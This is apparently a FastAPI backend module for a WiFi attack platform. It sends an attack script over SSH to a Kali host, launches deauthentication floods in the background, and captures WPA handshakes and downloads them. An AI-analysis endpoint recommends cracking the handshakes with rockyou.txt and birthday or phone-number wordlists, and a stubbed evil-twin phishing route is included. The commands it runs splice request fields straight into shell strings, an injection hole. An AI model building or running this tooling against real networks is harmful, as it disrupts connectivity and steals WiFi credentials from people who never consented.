from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from app.modules.ai_agent.service import ai_service
from app.core.ssh_manager import ssh_client
import os
import time
import json
from pathlib import Path

router = APIRouter()


# === 请求模型 ===
class AttackRequest(BaseModel):
    bssid: str
    interface: str = "wlan0"
    channel: str = "1"
    duration: int = 60


class AIAnalysisRequest(BaseModel):
    ssid: str
    encryption: str
    bssid: str


# === 🛡️ 智能脚本定位 (解决 500 错误的核心) ===
def find_payload_script(script_name: str):
    """在项目级范围内递归查找脚本"""
    # 获取当前文件绝对路径
    current_file = Path(__file__).resolve()

    # 定义搜索锚点
    search_paths = [
        current_file.parents[5] / "kali_payloads" / script_name,  # 标准结构
        current_file.parents[4] / "kali_payloads" / script_name,  # 备用结构
        Path.cwd() / "kali_payloads" / script_name,  # 运行目录
        Path.cwd().parent / "kali_payloads" / script_name,  # 上级目录
    ]

    for p in search_paths:
        if p.exists():
            print(f"[DEBUG] Found script at: {p}")
            return str(p)

    print(f"[!] CRITICAL: 找不到脚本 {script_name}。已搜索: {[str(p) for p in search_paths]}")
    return None


# =======================
# 1. Deauth 攻击接口 (修复 500)
# =======================
@router.post("/deauth")
async def start_deauth_attack(req: AttackRequest):
    print(f"[*] 收到 Deauth 请求: {req.bssid} on {req.interface}")

    if not ssh_client.client:
        try:
            ssh_client.connect()
        except Exception as e:
            raise HTTPException(500, f"SSH 连接失败: {str(e)}")

    # 1. 查找脚本
    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)

    if not local_path:
        raise HTTPException(500, f"服务端缺失 {script_name}，请检查 kali_payloads 文件夹")

    try:
        # 2. 上传脚本
        remote_path = ssh_client.upload_payload(local_path, script_name)
        if not remote_path:
            raise HTTPException(500, "脚本上传到 Kali 失败")

        # 3. 执行命令 (nohup 后台运行)
        duration = int(req.duration)
        cmd = f"nohup python3 {remote_path} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {duration} > /tmp/attack_deauth.log 2>&1 &"

        print(f"[*] Executing: {cmd}")
        ssh_client.exec_command(cmd)

        return {"status": "started", "msg": "Deauth 攻击已启动", "log": "/tmp/attack_deauth.log"}

    except Exception as e:
        print(f"[!] 攻击异常: {e}")
        raise HTTPException(500, f"执行异常: {str(e)}")


# =======================
# 2. 握手包捕获接口
# =======================
@router.post("/handshake")
async def start_handshake_capture(req: AttackRequest):
    print(f"[*] 收到握手包捕获请求: {req.bssid}")

    if not ssh_client.client:
        ssh_client.connect()

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path:
        raise HTTPException(500, f"服务端缺失 {script_name}")

    remote_path = ssh_client.upload_payload(local_path, script_name)

    # 同步执行
    cmd = f"python3 {remote_path} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"
    print(f"[*] Executing: {cmd}")

    try:
        # 等待脚本执行完毕
        stdin, stdout, stderr = ssh_client.exec_command(cmd)
        output = stdout.read().decode()
        print(f"[DEBUG] Kali Output:\n{output}")

        # 判断结果
        if "CAPTURED_HS_POTENTIAL" in output:
            # 尝试下载结果
            cap_files = [f"/tmp/handshake_{req.bssid.replace(':', '')}-01.cap",
                         f"/tmp/handshake_{req.bssid.replace(':', '')}-01.pcap"]

            remote_cap = None
            for f in cap_files:
                _in, _out, _err = ssh_client.exec_command(f"ls {f}")
                if not _err.read():
                    remote_cap = f
                    break

            if remote_cap:
                local_dir = Path.cwd() / "captures"
                if not local_dir.exists():
                    local_dir.mkdir()

                local_filename = f"handshake_{req.bssid.replace(':', '')}_{int(time.time())}.cap"
                local_save_path = local_dir / local_filename

                success = ssh_client.download_file(remote_cap, str(local_save_path))
                if success:
                    return {"status": "success", "msg": "成功捕获并下载握手包", "file": local_filename}

        return {"status": "failed", "msg": "未捕获到握手包", "debug": output}

    except Exception as e:
        return {"status": "error", "msg": str(e)}


# =======================
# 3. AI 分析接口 (修复 undefined)
# =======================
@router.post("/ai/analyze_target")
async def analyze_target(req: AIAnalysisRequest):
    try:
        # 调用 AI 服务
        raw_result = ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")

        # 强制格式检查 (兜底逻辑)
        if isinstance(raw_result, dict) and "risk_level" in raw_result:
            return raw_result

        # 如果 AI 返回了奇怪的东西，手动封装
        print(f"[WARN] AI 返回格式异常: {raw_result}")
        return {
            "risk_level": "中 (Medium)",
            "summary": "AI 服务暂未返回标准数据，根据加密方式推测。",
            "advice": "目标使用 WPA/WPA2 加密。建议尝试捕获握手包并运行 rockyou.txt 字典。",
            "dict_rules": ["纯数字", "手机号段", "生日组合"]
        }
    except Exception as e:
        print(f"[ERROR] AI 服务报错: {e}")
        return {
            "risk_level": "未知 (Unknown)",
            "summary": "AI 分析服务不可用。",
            "advice": f"系统错误: {str(e)}",
            "dict_rules": []
        }


@router.post("/eviltwin/start")
async def start_evil_twin(req: dict):
    # 简化版 Mock，防止报错
    return {"status": "started", "msg": "钓鱼功能演示模式已启动"}